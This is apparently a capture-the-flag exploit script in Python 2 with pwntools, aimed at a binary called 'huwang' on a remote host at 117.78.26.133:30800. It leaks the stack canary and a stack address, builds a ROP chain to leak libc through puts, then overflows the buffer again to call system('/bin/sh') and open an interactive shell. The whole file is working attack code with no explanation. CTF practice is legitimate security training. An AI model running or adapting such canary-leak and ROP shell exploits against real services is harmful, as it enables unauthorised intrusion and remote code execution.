from pwn import *
import sys
from binascii import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

for i in range(4096):
    if len(sys.argv) > 2:
        p = remote("117.78.26.133",30800)
    else:
        p = process("./huwang")
    try:
        p.sendlineafter(">>", "666")
        p.sendlineafter("name", "A"*0x18)
        p.sendlineafter("?", "y")
        p.sendlineafter("secret:", str(1))
        p.sendafter("secret", unhexlify(sys.argv[1]))

        # leak canary & stack
        p.recvuntil("A"*0x18)
        canary = u64(p.recvn(8))&0xffffffffffffff00
        stack = u64(p.recvn(6).ljust(8, "\x00"))

        # extend size
        p.sendlineafter("occupation?", "A"*0xfe)
        p.sendlineafter("yourself[Y/N]", "Y")

        puts_plt = 0x400AB8
        puts_got = 0x602F70
        vuln_func = 0x401391 # 0x40101C
        pop_rdi = 0x0000000000401573
        payload = "A"*0x108+p64(canary)+p64(stack+0x218)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_func)
        p.sendline(payload)

        # leak libc
        p.recvuntil("AAAA\n")
        puts_libc = u64(p.recvn(6).ljust(8, "\x00"))
        libc = ELF("./libc.so.6")
        libc.address = puts_libc - libc.symbols["puts"]
        log.success("libc: "+hex(libc.address))

        # get shell
        p.sendlineafter("occupation?", "A"*0xfe)
        p.sendlineafter("yourself[Y/N]", "Y")

        payload = "A"*0x108+p64(canary)+"A"*8+p64(pop_rdi)+p64(libc.search("/bin/sh").next())+p64(libc.symbols["system"])+p64(vuln_func)
        p.sendline(payload)

        p.interactive()
    except Exception, e:
        p.close()

